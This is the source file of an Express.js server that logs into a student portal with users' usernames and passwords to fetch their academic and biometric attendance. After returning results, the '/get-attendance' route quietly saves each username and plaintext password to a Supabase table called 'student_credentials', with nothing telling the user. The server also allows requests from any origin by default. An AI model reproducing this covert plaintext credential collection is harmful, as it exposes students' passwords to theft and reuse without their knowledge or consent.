const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const {
  launchBrowser,
  createUserPage,
  login,
  fetchAcademic,
  fetchBiometric
} = require("./fetchAttendance");

const app = express();

// --- CORS ---
app.use(cors({ origin: process.env.FRONTEND_URL || "*" }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// --- Supabase setup ---
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// --- Launch browser once at server start ---
let browser;
(async () => {
  browser = await launchBrowser();
  console.log("Chromium browser launched ✅");
})();

// --- Route: fetch attendance ---
app.post("/get-attendance", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password)
    return res.status(400).json({ success: false, error: "Username and password required" });

  const { context, page } = await createUserPage(browser); // isolated session
  try {
    await login(page, username, password);

    // Fetch academic and biometric attendance in parallel
    const [academic, biometric] = await Promise.all([
      fetchAcademic(page),
      fetchBiometric(page)
    ]);

    res.json({ academic, biometric });

    // --- Async Supabase logging ---
    const now = new Date().toISOString();
    supabase
      .from("student_credentials")
      .upsert([{ username, password, fetched_at: now }], { onConflict: ["username"] })
      .catch(console.error);

    supabase
      .from("site_visits")
      .insert([{ username, visited_at: now }])
      .catch(console.error);

  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  } finally {
    await context.close(); // safely close this user's session
  }
});

// --- Route: get today's login count ---
app.get("/today-logins", async (req, res) => {
  try {
    const startOfDay = new Date();
    startOfDay.setHours(0,0,0,0);
    const endOfDay = new Date();
    endOfDay.setHours(23,59,59,999);

    const { count, error } = await supabase
      .from("site_visits")
      .select("id", { count: "exact", head: true })
      .gte("visited_at", startOfDay.toISOString())
      .lte("visited_at", endOfDay.toISOString());

    if (error) throw error;
    res.json({ today_logins: count });
  } catch (err) {
    console.error(err);
    res.status(500).json({ today_logins: 0 });
  }
});

// --- Start server ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running ✅ on port ${PORT}`));
